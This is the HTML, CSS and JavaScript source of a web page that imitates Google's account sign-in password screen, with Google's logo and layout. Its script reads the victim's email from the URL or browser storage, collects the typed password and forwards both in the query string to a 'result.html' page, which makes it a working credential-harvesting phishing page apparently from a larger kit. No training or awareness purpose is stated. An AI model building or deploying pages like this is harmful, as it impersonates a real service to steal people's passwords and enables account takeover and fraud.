<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in â€“ Google accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #f2f6fc;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            background: #fff;
            border-radius: 28px;
            box-shadow: 0 2px 10px rgba(60,64,67,.15);
            width: 96vw;
            max-width: 1200px;
            min-width: 0;
            margin: 100px auto 0 auto;
            padding: 48px 60px 36px 60px;
            display: flex;
            flex-direction: row;
            align-items: flex-start;
            box-sizing: border-box;
            transition: max-width 0.3s, padding 0.3s, flex-direction 0.3s;
        }
        .left, .right {
            display: flex;
            flex-direction: column;
        }
        .left {
            max-width: 340px;
            margin-right: 120px; /* Increased space between left and right */
            flex: none;
        }
        .right {
            flex: 2;
            justify-content: flex-start;
            margin-top: 0;
        }
        .right-inner {
            /* Align the right part with the top of the account chip, not "Hi Jac" */
            margin-top: 130px; /* Adjust this value to match the height from top to account chip */
        }
        @media (max-width: 700px) {
            .container {
                flex-direction: column;
                max-width: 98vw;
                width: 100%;
                padding: 24px 8px;
                margin-top: 24px;
                align-items: stretch;
            }
            .left {
                margin-right: 0;
                max-width: 100%;
                align-items: flex-start;
            }
            .right {
                width: 100%;
            }
            .right-inner {
                margin-top: 0 !important;
            }
            .footer-bar {
                flex-direction: column;
                align-items: center;
                padding: 0 8px;
                gap: 8px;
            }
            .footer {
                justify-content: center;
                padding-right: 0;
            }
            .lang-select {
                justify-content: center;
                padding-left: 0;
            }
        }
        .google-logo {
            width: 40px;
            height: 40px;
            margin-bottom: 24px;
        }
        h1 {
            font-size: 32px;
            font-weight: 400;
            margin: 0 0 32px 0;
        }
        .account-chip {
            display: flex;
            align-items: center;
            background: #f1f3f4;
            border: 1px solid #dadce0;
            border-radius: 24px;
            padding: 4px 16px 4px 4px;
            font-size: 16px;
            margin-bottom: 32px;
            width: fit-content;
        }
        .account-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #5f6368;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            font-weight: 500;
            margin-right: 8px;
        }
        .account-email {
            margin-right: 8px;
            font-size: 16px;
            color: #202124;
        }
        .account-dropdown {
            border: none;
            background: transparent;
            font-size: 18px;
            color: #5f6368;
            cursor: pointer;
            padding: 0;
        }
        .form-label {
            display: none;
        }
        .input-box {
            width: 100%;
            margin-bottom: 8px;
            display: flex;
            justify-content: flex-end;
        }
        input[type="password"],
        input[type="text"]#password {
            width: 480px; /* Larger input box */
            min-width: 0;
            max-width: 100%;
            padding: 16px 12px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            margin-bottom: 8px;
            box-sizing: border-box;
            color: #202124;
            background: #fff;
            height: 48px;
            transition: none;
            display: block;
        }
        input[type="password"]:focus {
            border-color: #4285f4; /* Match sign_in.html focus color */
        }
        input[type="password"]::placeholder {
            color: #5f6368; /* Match sign_in.html placeholder color */
            opacity: 1;
        }
        .show-password-row {
            display: flex;
            align-items: center;
            justify-content: flex-start; /* Align to the left of the input */
            width: 480px; /* Match input width */
            margin-left: auto;
            margin-right: 0;
            margin-bottom: 32px;
            margin-top: 8px;
        }
        .show-password-row label {
            font-size: 16px;
            color: #3c4043;
            margin-left: 8px;
            cursor: pointer;
        }
        .actions {
            display: flex;
            width: 100%;
            justify-content: flex-end;
            align-items: center;
            gap: 24px;
            margin-top: 16px;
        }
        .try-another {
            color: #1a73e8;
            background: none;
            border: none;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            padding: 0 8px 0 0;
        }
        .next-btn {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 24px;
            padding: 10px 32px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .next-btn:hover {
            background: #1765c1;
        }
        .footer-bar {
            width: 100%;
            max-width: 900px;
            margin: 24px auto 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
            padding: 0 40px;
        }
        .lang-select {
            font-size: 12px;
            color: #5f6368;
            display: flex;
            align-items: center;
        }
        .footer {
            color: #5f6368;
            font-size: 14px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 16px;
        }
        @media (max-width: 700px) {
            .container {
                flex-direction: column;
                max-width: 98vw;
                width: 100%;
                padding: 24px 8px;
                margin-top: 24px;
                align-items: stretch;
            }
            .left {
                margin-right: 0;
                max-width: 100%;
                align-items: flex-start;
            }
            .right {
                width: 100%;
            }
            .right-inner {
                margin-top: 0 !important;
            }
            .footer-bar {
                flex-direction: column;
                align-items: center;
                padding: 0 8px;
                gap: 8px;
            }
            .footer {
                justify-content: center;
                padding-right: 0;
            }
            .lang-select {
                justify-content: center;
                padding-left: 0;
            }
        }
    </style>
    <script>
        // Get email from localStorage or query string
        function getEmail() {
            const params = new URLSearchParams(window.location.search);
            let email = params.get('email');
            if (!email) {
                email = localStorage.getItem('signin_email') || '';
            }
            return email;
        }
        // Set email and avatar
        window.onload = function() {
            const email = getEmail();
            document.getElementById('account-email').textContent = email;
            document.getElementById('account-avatar').textContent = email ? email[0].toUpperCase() : '';
        };

        // Handle form submit and pass email & password to result.html
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('password-form').addEventListener('submit', function(e) {
                e.preventDefault();
                const email = getEmail();
                const password = document.getElementById('password').value;
                // Pass both as query string to result.html
                window.location.href = 'result.html?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="left">
            <img class="google-logo" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" alt="Google">
            <h1>Hi,</h1>
            <div class="account-chip">
                <span class="account-avatar" id="account-avatar"></span>
                <span class="account-email" id="account-email"></span>
                <button class="account-dropdown" type="button">&#9660;</button>
            </div>
        </div>
        <div class="right">
            <div class="right-inner">
                <form id="password-form">
                    <div class="input-box">
                        <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="Enter your password">
                    </div>
                    <div class="show-password-row">
                        <input type="checkbox" id="show-password" onclick="document.getElementById('password').type = this.checked ? 'text' : 'password';">
                        <label for="show-password">Show password</label>
                    </div>
                    <div class="actions">
                        <a class="try-another" href="#">Try another way</a>
                        <button class="next-btn" type="submit">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="footer-bar">
        <div class="lang-select">
            English (United States)
            <span style="font-size:12px;">&#9660;</span>
        </div>
        <div class="footer">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
